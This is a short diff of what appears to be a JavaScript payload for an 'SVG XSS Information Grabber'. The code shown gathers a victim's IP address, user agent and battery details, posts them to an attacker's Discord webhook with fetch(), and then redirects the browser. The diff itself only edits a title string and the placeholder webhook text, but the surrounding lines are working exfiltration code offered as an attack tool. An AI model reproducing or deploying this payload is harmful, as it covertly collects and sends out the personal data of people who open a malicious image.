@@ -21,7 +21,7 @@
                username: "SVG XSS Information Grabber - By SSSEAL-C on Github",
                avatar_url: "https://i.imgur.com/Yztlbk4.png",
                embeds: [{ 
-                  title: 'SVG XSS Attack', 
+                  title: 'SVG XSS Attack by SSSEAL-C (v1.0)', 
                   fields: [ 
                   { name: 'IP :globe_with_meridians:',  value: "`"+data.YourFuckingIPAddress+"`", inline: "true" },
                   { name: 'User Agent :bust_in_silhouette:', value: "`"+navigator.userAgent+"`", inline: "true" } ,
@@ -37,7 +37,7 @@
                   { name:'Battery Charging :battery:', value:'`'+battery.charging+"`",  inline:true }
                   ]
                }]})}
-         var URL = `webhook url`;
+         var URL = `discord webhook url`;
          fetch(URL, opts2).then(function (response) {
             console.log(response);
             window.location.replace(url2); 
